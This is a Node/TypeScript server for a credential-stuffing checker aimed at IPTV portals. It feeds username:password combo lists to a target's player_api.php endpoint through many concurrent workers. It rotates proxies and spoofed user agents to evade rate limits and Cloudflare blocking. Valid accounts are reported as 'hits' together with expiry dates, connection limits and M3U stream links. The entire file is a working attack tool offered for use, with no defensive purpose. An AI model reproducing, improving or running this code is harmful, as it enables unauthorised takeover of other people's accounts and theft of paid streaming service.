import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import { Server } from "socket.io";
import http from "http";
import axios from "axios";
import { HttpsProxyAgent } from "https-proxy-agent";
import { SocksProxyAgent } from "socks-proxy-agent";

// Common User Agents for rotation
const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200/2.1.0 Safari/533.3',
];

interface CheckRequest {
  portal: string;
  combo: string[];
  threads: number;
  proxies: string[];
  proxyType: 'http' | 'socks4' | 'socks5' | 'none';
  bypassCloudflare: boolean;
  randomUserAgent: boolean;
}

interface HitResult {
  username: string;
  password: string;
  created?: string;
  expiry?: string;
  daysLeft?: number;
  activeCons?: string;
  maxCons?: string;
  status?: string;
  liveCount?: number;
  vodCount?: number;
  seriesCount?: number;
  timezone?: string;
  m3uLink?: string;
}

async function startServer() {
  const app = express();
  const httpServer = http.createServer(app);
  const io = new Server(httpServer);
  const PORT = 3000;

  app.use(express.json({ limit: '50mb' }));

  io.on("connection", (socket) => {
    socket.on("startCheck", async (data: CheckRequest) => {
      const { portal, combo, threads, proxies, proxyType, bypassCloudflare, randomUserAgent } = data;
      
      // Robust host extraction
      let host = portal.trim()
        .replace(/^https?:\/\//i, '')
        .split('/')[0];
      
      if (!host) {
        socket.emit("finished", { hits: 0, bad: 0, proxyErrors: 0, error: "Invalid Host" });
        return;
      }

      console.log(`[ENGINE] Starting scan for ${host} with ${threads} threads and ${combo.length} accounts`);
      
      let processed = 0;
      let hits = 0;
      let bad = 0;
      let proxyErrors = 0;
      let startTime = Date.now();

      let currentIdx = 0;
      const getNextPair = () => {
        if (currentIdx >= combo.length) return null;
        return combo[currentIdx++];
      };

      const proxyQueue = [...proxies];
      
      const getNextProxy = () => {
        if (proxyQueue.length === 0) return null;
        const p = proxyQueue.shift()!;
        proxyQueue.push(p); // Rotate
        return p;
      };

      const getAgent = (proxyStr: string | null) => {
        if (!proxyStr) return null;
        
        try {
          // Detect protocol from string or default to http
          const url = proxyStr.includes('://') ? proxyStr : `http://${proxyStr}`;
          
          if (url.startsWith('socks')) {
            return new SocksProxyAgent(url);
          }
          return new HttpsProxyAgent(url);
        } catch (e) {
          return null;
        }
      };

      const worker = async () => {
        while (true) {
          const pair = getNextPair();
          if (!pair) break;

          const parts = pair.split(':');
          if (parts.length < 2) {
            processed++;
            continue;
          }
          
          const user = parts[0].trim();
          const pass = parts.slice(1).join(':').trim();

          let attempt = 0;
          let success = false;
          const maxRetries = proxies.length > 0 ? 2 : 1;

          while (attempt < maxRetries && !success) {
            const currentProxy = getNextProxy();
            const agent = getAgent(currentProxy);
            const userAgent = randomUserAgent 
              ? USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]
              : USER_AGENTS[USER_AGENTS.length - 1]; 

            const headers: any = {
              'User-Agent': userAgent,
              'Accept': '*/*',
              'X-Requested-With': 'com.stb.emu.pro',
              'Connection': 'Keep-Alive',
            };

            try {
              const testUrl = `http://${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
              const response = await axios.get(testUrl, { 
                headers, 
                httpsAgent: agent,
                httpAgent: agent,
                timeout: 8000,
                validateStatus: (status) => status < 500
              });

              if (response.status === 403 || response.status === 503) {
                const serverHeader = String(response.headers['server'] || '');
                if (String(response.data || '').includes('Cloudflare') || serverHeader.includes('cloudflare')) {
                  throw new Error('Cloudflare Block');
                }
              }

              const info = response.data;

              if (info && info.user_info && info.user_info.status === 'Active') {
                const userInfo = info.user_info;
                const result: HitResult = {
                  username: user,
                  password: pass,
                  activeCons: userInfo.active_cons || "0",
                  maxCons: userInfo.max_connections || "0",
                  status: userInfo.status,
                  timezone: info.server_info?.timezone,
                  m3uLink: `http://${host}/get.php?username=${user}&password=${pass}&type=m3u_plus`
                };

                if (userInfo.exp_date && userInfo.exp_date !== "null" && userInfo.exp_date !== "0") {
                  const expTS = parseInt(userInfo.exp_date) * 1000;
                  result.expiry = new Date(expTS).toLocaleDateString();
                  result.daysLeft = Math.ceil((expTS - Date.now()) / (1000 * 60 * 60 * 24));
                } else {
                  result.expiry = "Unlimited";
                  result.daysLeft = 9999;
                }

                hits++;
                socket.emit("hit", result);
                
                // Fetch extra info in background
                (async () => {
                  try {
                    const opts = { headers, httpsAgent: agent, httpAgent: agent, timeout: 5000 };
                    const [live, vod, series] = await Promise.allSettled([
                      axios.get(`http://${host}/player_api.php?username=${user}&password=${pass}&action=get_live_streams`, opts),
                      axios.get(`http://${host}/player_api.php?username=${user}&password=${pass}&action=get_vod_streams`, opts),
                      axios.get(`http://${host}/player_api.php?username=${user}&password=${pass}&action=get_series`, opts)
                    ]);
                    
                    const updatedResult = { ...result };
                    if (live.status === 'fulfilled') updatedResult.liveCount = Array.isArray(live.value.data) ? live.value.data.length : 0;
                    if (vod.status === 'fulfilled') updatedResult.vodCount = Array.isArray(vod.value.data) ? vod.value.data.length : 0;
                    if (series.status === 'fulfilled') updatedResult.seriesCount = Array.isArray(series.value.data) ? series.value.data.length : 0;
                    
                    socket.emit("hitUpdate", updatedResult);
                  } catch (e) {}
                })();

                success = true;
              } else {
                bad++;
                success = true;
              }
            } catch (error: any) {
              attempt++;
              if (attempt >= maxRetries) {
                bad++;
                if (error.code === 'ECONNREFUSED' || error.code === 'ETIMEDOUT' || error.message?.includes('Cloudflare')) {
                  proxyErrors++;
                }
              }
            }
          }

          processed++;
          const elapsed = (Date.now() - startTime) / 1000;
          const cpm = Math.round((processed / elapsed) * 60) || 0;
          
          if (processed % 10 === 0 || combo.length < 100) {
            const elapsed = (Date.now() - startTime) / 1000;
            const cpm = Math.round((processed / elapsed) * 60) || 0;
            
            socket.emit("progress", {
              processed,
              total: combo.length,
              hits,
              bad,
              cpm,
              percent: Math.round((processed / combo.length) * 100),
              proxyErrors
            });
          }
        }
      };

      const threadCount = Math.min(threads || 1, combo.length, 1000);
      const activeThreads = new Array(threadCount).fill(null);
      await Promise.all(activeThreads.map(() => worker()));
      socket.emit("finished", { hits, bad, proxyErrors });
    });
  });

  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  httpServer.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
